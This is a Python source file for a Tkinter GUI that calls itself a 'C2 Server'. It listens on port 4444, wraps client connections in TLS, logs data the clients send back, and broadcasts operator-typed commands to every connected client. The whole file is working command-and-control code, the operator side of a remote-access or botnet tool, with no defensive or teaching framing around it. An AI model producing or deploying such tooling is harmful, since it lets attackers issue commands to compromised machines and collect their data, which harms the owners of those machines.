import tkinter as tk
from tkinter import scrolledtext
import socket
import threading
import ssl

class C2Server:
    def __init__(self, master):
        self.master = master
        self.master.title("C2 Server")
        self.master.configure(bg="black")
        
        # Configure the style of the UI
        self.style = {"bg": "black", "fg": "green", "font": ("Courier", 12), "insertbackground": "green"}

        self.log_area = scrolledtext.ScrolledText(master, wrap=tk.WORD, width=50, height=20, bg=self.style["bg"], fg=self.style["fg"], font=self.style["font"], insertbackground=self.style["insertbackground"])
        self.log_area.grid(row=0, column=0, padx=10, pady=10, columnspan=2)
        
        self.command_label = tk.Label(master, text="Command:", bg=self.style["bg"], fg=self.style["fg"], font=self.style["font"])
        self.command_label.grid(row=1, column=0, padx=10, pady=5, sticky=tk.W)
        
        self.command_entry = tk.Entry(master, width=40, bg=self.style["bg"], fg=self.style["fg"], font=self.style["font"], insertbackground=self.style["insertbackground"])
        self.command_entry.grid(row=1, column=1, padx=10, pady=5, sticky=tk.W)
        
        self.send_button = tk.Button(master, text="Send Command", command=self.send_command, bg=self.style["bg"], fg=self.style["fg"], font=self.style["font"])
        self.send_button.grid(row=2, column=0, pady=10)
        
        self.quit_button = tk.Button(master, text="Quit Server", command=self.quit_server, bg=self.style["bg"], fg=self.style["fg"], font=self.style["font"])
        self.quit_button.grid(row=2, column=1, pady=10)

        self.host = '0.0.0.0'
        self.port = 4444
        self.clients = []
        self.server_socket = None
        self.setup_server()
    
    def setup_server(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.log_area.insert(tk.END, f"Server started on {self.host}:{self.port}\n")
        
        threading.Thread(target=self.accept_clients, daemon=True).start()
    
    def accept_clients(self):
        while True:
            try:
                client_socket, addr = self.server_socket.accept()
                self.log_area.insert(tk.END, f"Client connected from {addr}\n")
                
                # Wrap the socket with SSL for encryption
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                context.load_cert_chain(certfile="server.crt", keyfile="server.key")
                secure_socket = context.wrap_socket(client_socket, server_side=True)
                
                self.clients.append(secure_socket)
                threading.Thread(target=self.handle_client, args=(secure_socket,), daemon=True).start()
            except Exception as e:
                self.log_area.insert(tk.END, f"Error accepting client: {e}\n")
    
    def handle_client(self, client_socket):
        while True:
            try:
                data = client_socket.recv(1024)
                if not data:
                    break
                self.log_area.insert(tk.END, f"Received: {data.decode()}\n")
            except Exception as e:
                self.log_area.insert(tk.END, f"Error handling client: {e}\n")
                break
        
        client_socket.close()
        self.clients.remove(client_socket)
        self.log_area.insert(tk.END, "Client disconnected\n")
    
    def send_command(self):
        command = self.command_entry.get()
        self.log_area.insert(tk.END, f"Sending command: {command}\n")
        for client in self.clients:
            try:
                client.send(command.encode())
            except Exception as e:
                self.log_area.insert(tk.END, f"Failed to send command to a client: {e}\n")
        
        self.command_entry.delete(0, tk.END)
    
    def quit_server(self):
        self.log_area.insert(tk.END, "Shutting down server...\n")
        for client in self.clients:
            try:
                client.close()
            except Exception as e:
                self.log_area.insert(tk.END, f"Error closing client connection: {e}\n")
        
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception as e:
                self.log_area.insert(tk.END, f"Error closing server socket: {e}\n")
        
        self.master.quit()

if __name__ == "__main__":
    root = tk.Tk()
    app = C2Server(root)
    root.mainloop()




